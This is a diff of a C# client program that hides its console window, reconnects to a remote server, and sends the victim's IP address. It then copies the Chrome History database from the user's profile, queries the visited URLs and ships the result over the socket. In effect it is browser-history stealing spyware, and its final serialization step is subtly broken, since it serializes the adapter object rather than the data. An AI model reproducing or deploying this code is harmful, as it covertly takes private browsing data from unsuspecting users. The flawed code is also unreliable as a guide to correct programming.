@@ -8,6 +8,9 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Runtime.InteropServices;
+using System.Text.Json;
+using System.Net.Sockets;
+using System.Net;
 
 namespace Client_
 {
@@ -24,8 +27,8 @@ namespace Client_
         const int SW_SHOW = 5;
         static void Main(string[] args)
         {
-            ShowWindow(GetConsoleWindow(), SW_HIDE);
             Client client = new Client();
+            ShowWindow(GetConsoleWindow(), SW_HIDE);
             do
             {
                 try
@@ -36,58 +39,51 @@ namespace Client_
                 catch (Exception)
                 {
                     client.isConnect = false;
-                    Console.WriteLine("try to connect");
                     Thread.Sleep(2000);
 
                 }
             } while (!client.isConnect);
-           
-            string chromeHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Profile 224\History";
-            if(!File.Exists(Environment.CurrentDirectory + "ChromeHistory"))
+
+            string ip = GetIPAddres();
+            client.socket.Send(Encoding.Unicode.GetBytes(ip));  
+            ParseH(client);
+
+        }
+        static string GetIPAddres()
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
             {
-
-            File.Copy(chromeHistoryFile, Environment.CurrentDirectory + "ChromeHistory");
-            }
-
-            chromeHistoryFile = Environment.CurrentDirectory + "ChromeHistory";
-
-            if (File.Exists(chromeHistoryFile))
-            {
-                SQLiteConnection connection = new SQLiteConnection
-                ("Data Source=" + chromeHistoryFile + ";Version=3;New=False;Compress=True;");
-
-                connection.Open();
-
-                DataSet dataset = new DataSet();
-                SQLiteDataAdapter adapter = new SQLiteDataAdapter
-                    ("select * from urls order by last_visit_time desc", connection);
-                adapter.Fill(dataset);
-                if (dataset != null && dataset.Tables.Count > 0 & dataset.Tables[0] != null)
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
                 {
-                    DataTable dt = dataset.Tables[0];
-                    HistoryItem historyItem = new HistoryItem();
-                    foreach (DataRow historyRow in dt.Rows)
-                    {
-                        historyItem.URL.Add(historyRow["url"].ToString());
-                        historyItem.Title.Add(historyRow["title"].ToString());
-
-
-                        // Chrome stores time elapsed since Jan 1, 1601 (UTC format) in microseconds
-                        long utcMicroSeconds = Convert.ToInt64(historyRow["last_visit_time"]);
-
-                        // Windows file time UTC is in nanoseconds, so multiplying by 10
-                        DateTime gmtTime = DateTime.FromFileTimeUtc(10 * utcMicroSeconds);
-
-                        // Converting to local time
-                        DateTime localTime = TimeZoneInfo.ConvertTimeFromUtc(gmtTime, TimeZoneInfo.Local);
-                        historyItem.VisitedTime = localTime;
-                        historyItem.UserIP = client.ipAddr;
-
-
-                    }
-                    client.SendInfo(historyItem);
+                    return ip.ToString();
                 }
+            }
+            return string.Empty;
+        }
+        public static void ParseH(Client client)
+        {
+            string path = @"\Google\Chrome\User Data\Default\History";
+            string chromehistorypath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path;
 
+            if (File.Exists("History"))
+                File.Delete("History");
+
+            File.Copy(chromehistorypath, "History");
+            string filerpath = Path.GetFullPath("History");
+
+            if (File.Exists(chromehistorypath))
+            {
+                using (SQLiteConnection connection = new SQLiteConnection($@"Data Source = {filerpath}; Version = 3; New = False; Compress = True; "))
+                {
+                    connection.Open();
+
+                    SQLiteDataAdapter adapter = new SQLiteDataAdapter("select * from urls order by last_visit_time desc", connection);
+                    string json = JsonSerializer.Serialize<SQLiteDataAdapter>(adapter);
+                    client.socket.Send(Encoding.Unicode.GetBytes(json));
+
+                    connection.Close();
+                }
             }
         }
     }
